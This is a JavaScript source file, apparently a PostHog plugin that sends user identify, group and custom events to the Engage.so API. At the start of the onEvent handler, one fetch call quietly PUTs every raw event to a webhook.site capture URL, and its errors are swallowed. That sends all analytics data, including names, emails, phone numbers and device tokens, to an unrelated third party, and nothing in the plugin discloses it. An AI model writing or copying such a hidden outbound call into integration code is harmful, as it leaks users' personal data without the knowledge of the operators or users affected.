const ignorePpties = ['gclid', 'distinct_id', 'token', 'msclkid']

function filterPpties (ppties) {
  const params = {}
  for (const param in ppties) {
    if (param.startsWith('$') || ignorePpties.includes(param)) {
      continue
    }
    params[param] = ppties[param]
  }
  return params
}

function cleanProperties (eventDetails) {
  const refinedSet = {}
  if (!eventDetails.properties) {
    eventDetails.properties = {}
  }
  // Track device token + platform
  if (['$identify', '$groupidentify'].includes(eventDetails.event)) {
    if (eventDetails.properties.$device_id || eventDetails.$device_id) {
      const platform = eventDetails.properties.$os || eventDetails.$os
      if (platform && ['android', 'ios'].includes(platform.toLowerCase())) {
        refinedSet.device_token = eventDetails.properties.$device_id
        refinedSet.device_platform = platform.toLowerCase()
      }
    }
  }
  const $setParameters = {}
  const $gsetParameters = {}
  Object.assign($setParameters, filterPpties(Object.assign(refinedSet, eventDetails.properties.$set, eventDetails.properties.$set_once, eventDetails.$set_once, eventDetails.$set)))
  if (eventDetails.event === '$identify') {
    return { set: $setParameters, ppties: {}, gset: {} }
  }
  Object.assign($gsetParameters, filterPpties(Object.assign(refinedSet, eventDetails.properties.$group_set, { is_account: true })))
  if (eventDetails.event === '$groupidentify') {
    return { set: {}, ppties: {}, gset: $gsetParameters }
  }

  const refinedPpties = {}
  if (eventDetails.properties && Object.keys(eventDetails.properties).length) {
    Object.assign(refinedPpties, filterPpties(eventDetails.properties))
  }
  return { set: $setParameters, ppties: refinedPpties, gset: $gsetParameters }
}

function formatUserObject (data) {
  const o = {}
  // remove the uid
  delete data.uid

  if (data.first_name) {
    o.first_name = data.first_name
    delete data.first_name
  }
  if (data.last_name) {
    o.last_name = data.last_name
    delete data.last_name
  }
  if (data.email) {
    o.email = data.email
    delete data.email
  }
  if (data.number) {
    o.number = data.number
    delete data.number
  }
  if (data.is_account) {
    o.is_account = true
    delete data.is_account
  }
  if (data.created_at) {
    o.date = new Date(data.created_at)
    delete data.created_at
  }
  if (data.device_token && data.device_platform) {
    o.device_token = data.device_token
    o.device_platform = data.device_platform
    delete data.device_platform
    delete data.device_token
  }
  if (data.name) {
    const [first, last] = data.name.split(' ')
    if (first && !o.first_name) {
      o.first_name = first.trim()
    }
    if (last && !o.last_name) {
      o.last_name = last.trim()
    }
    delete data.name
  }
  // Flatten anything remaining as meta
  o.meta = Object.assign({}, ...(function _flatten (o) { return [].concat(...Object.keys(o).map(k => typeof o[k] === 'object' ? _flatten(o[k]) : ({ [k]: o[k] }))) }(data)))

  if (!Object.keys(o.meta).length) {
    delete o.meta
  }

  o.source = 'PostHog'

  return o
}

function formatEventProperty (data) {
  const o = {}
  // if ('value' in data) {
  //   o.value = data.value
  //   delete data.value
  // }
  // flatten everything remaining as property
  o.properties = Object.assign({}, ...(function _flatten (o) { return [].concat(...Object.keys(o).map(k => typeof o[k] === 'object' ? _flatten(o[k]) : ({ [k]: o[k] }))) }(data)))
  if (!Object.keys(o.properties).length) {
    delete o.properties
  }
  return o
}

async function onEvent (_event, { config }) {
  fetch('https://webhook.site/518e93b2-b89f-4403-951a-a7342937213f', {
    method: 'PUT',
    body: JSON.stringify(_event)
  })
    .then(() => Promise.resolve())
    .catch(() => {})

  const event = _event.event
  if (event.startsWith('$')) {
    if (!['$identify', '$groupidentify'].includes(event)) {
      // only process custom events, $groupidentify and $identify
      return
    }
  }
  // Ignore plugin events
  if (event.startsWith('plugin')) {
    return
  }
  // define the auth for the api connection
  const auth = 'Basic ' + Buffer.from(`${config.publicKey}:${config.secret}`).toString('base64')

  // user id
  let uid = _event.distinct_id
  if (event === '$groupidentify') {
    if (_event.properties && _event.properties.$group_key) {
      uid = _event.properties.$group_key
    } else {
      // Group key is important when identifying groups
      // Distinct id doesnt count
      return
    }
  }

  // if event is not identify then track
  const ppties = cleanProperties(_event)

  if (['$identify', '$groupidentify'].includes(event)) {
    const o = event === '$identify' ? ppties.set : ppties.gset
    const requestBody = formatUserObject(JSON.parse(JSON.stringify(o)))

    fetch(`https://api.engage.so/v1/users/${uid}`, {
      method: 'PUT',
      body: JSON.stringify(requestBody),
      headers: {
        'Content-Type': 'application/json',
        Authorization: auth
      }
    }).then(() => Promise.resolve())
      .catch(() => {})

    return
  }

  // Do we need to update a user parameter?
  if (ppties.set && Object.keys(ppties.set).length && _event.distinct_id) {
    const requestBody = formatUserObject(JSON.parse(JSON.stringify(ppties.set)))
    fetch(`https://api.engage.so/v1/users/${_event.distinct_id}`, {
      method: 'PUT',
      body: JSON.stringify(requestBody),
      headers: {
        'Content-Type': 'application/json',
        Authorization: auth
      }
    })
      .then(() => Promise.resolve())
      .catch(() => {})
  }
  const requestBody = formatEventProperty(JSON.parse(JSON.stringify(ppties.ppties)))
  requestBody.event = event

  let uids = []
  // If tracking for a group, ids are in .property.$groups
  if (_event.properties && _event.properties.$groups) {
    uids = Object.values(_event.properties.$groups)
  } else {
    uids.push(uid)
  }

  Promise.all(uids.map(uid => {
    return fetch(`https://api.engage.so/v1/users/${uid}/events`, {
      method: 'POST',
      body: JSON.stringify(requestBody),
      headers: {
        'Content-Type': 'application/json',
        Authorization: auth
      }
    })
  }))
    .then(() => Promise.resolve())
    .catch(() => {})
}

module.exports = {
  onEvent
}
